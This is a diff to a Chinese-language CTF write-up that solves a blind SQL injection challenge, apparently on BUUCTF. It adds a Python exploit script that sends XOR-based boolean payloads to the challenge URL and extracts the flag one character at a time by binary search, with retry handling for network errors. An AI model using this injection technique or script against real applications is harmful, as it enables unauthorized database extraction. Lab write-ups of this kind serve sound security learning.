@@ -133,3 +133,69 @@ id = 0^((substr((select(flag)from(flag)),1,1))='f')
 ```
 已经可以看出差别了，那就上脚本，这里不知道是我脚本有问题还是环境有问题，总是跑到一半就开始乱码或者停止，可能是一些网络问题，怎么改脚本也没用，我这里选择分批获取flag，先跑一半，再跑一半
 ![500](assets/Day%205/file-20251223183806855.png)
+![700](assets/Day%205/file-20251223183857937.png)
+exp：
+```python
+import requests
+import time
+
+url = "http://76b13ca1-49ab-4c96-ad9f-4cfaf7f2d88c.node5.buuoj.cn:81/"
+session = requests.Session()
+
+
+def check(payload):
+    # 【核心改动1】增加重试机制
+    # 只要有一次成功返回 Hello 就算 True，只有试了 5 次都没 Hello 才算 False
+    for _ in range(5):
+        try:
+            r = session.post(url, data={"id": payload}, timeout=7)  # 增加超时时间
+            if "Hello" in r.text:
+                return True
+            # 如果请求成功但没有 Hello，说明表达式确实为假
+            return False
+        except:
+            # 如果是网络报错（超时、连接断开），等 0.5 秒重试
+            time.sleep(0.5)
+            continue
+    return False
+
+
+flag = ""
+print("[+] Start searching flag...")
+
+for pos in range(29, 64):
+    low = 32
+    high = 127
+
+    # 【核心改动2】探测当前位置是否有字符，确认 3 次防止误判
+    is_char_exists = False
+    for _ in range(3):
+        if check(f"0^(ascii(substr((select(flag)from(flag)),{pos},1))>0)"):
+            is_char_exists = True
+            break
+
+    if not is_char_exists:
+        print("\n[*] Flag extraction complete.")
+        break
+
+    # 二分法部分
+    while low < high:
+        mid = (low + high) // 2
+        payload = f"0^(ascii(substr((select(flag)from(flag)),{pos},1))>{mid})"
+
+        if check(payload):
+            low = mid + 1
+        else:
+            high = mid
+
+    # 【核心改动3】容错处理
+    # 如果 low 还在 32，说明没跑出来，可能真的结束了或出了大错
+    if low == 32:
+        break
+
+    flag += chr(low)
+    # 增加实时打印，防止看不到进度
+    print(f"\r[+] Found: {flag}", end="", flush=True)
+
+print(f"\n\n[SUCCESS] Final Flag: {flag}")
+```
